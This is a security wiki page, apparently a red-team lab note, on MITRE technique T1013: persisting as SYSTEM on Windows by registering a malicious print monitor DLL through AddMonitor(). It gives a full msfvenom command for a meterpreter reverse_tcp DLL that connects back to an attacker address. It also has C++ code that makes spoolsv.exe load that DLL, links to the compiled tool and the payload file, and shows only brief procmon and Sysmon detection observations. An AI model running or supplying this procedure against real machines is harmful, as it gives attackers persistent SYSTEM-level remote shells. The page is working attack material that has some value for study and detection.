---
description: 'Persistence, Privilege Escalation'
---

# T1013: AddMonitor\(\)

## Execution

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:

{% code title="attacker@local" %}
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
```
{% endcode %}

Writing and compiling a simple C++ code that will register the monitor port:

{% code title="monitor.cpp" %}
```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```
{% endcode %}

{% file src="../../.gitbook/assets/t1013-portmonitor64.exe" caption="PortMonitor64" %}

{% file src="../../.gitbook/assets/evil64.dll" caption="evil64.dll - meterpreter payload" %}

Move evil64.dll to `%systemroot%` and execute the compiled `monitor.cpp`.

## Observations

Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed by the spoolsvc:

![](../../.gitbook/assets/monitor-loaddll.png)

![](../../.gitbook/assets/monitor-loaddll2.png)

which eventually spawns a rundll32 with meterpreter payload, that initiates a connection back to the attacker:

![](../../.gitbook/assets/rundll-connect.png)

![](../../.gitbook/assets/monitor-shell-system.png)

The below confirms the procmon results explained above:

![](../../.gitbook/assets/monitor-spoolsvc-rundll.png)

Sysmon commandline arguments and network connection logging to the rescue:

![](../../.gitbook/assets/monitor-sysmon.png)

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1013" %}

{% embed url="https://www.youtube.com/watch?v=dq2Hv7J9fvk" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd183341\(v=vs.85\).aspx" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd145068\(v=vs.85\).aspx" %}



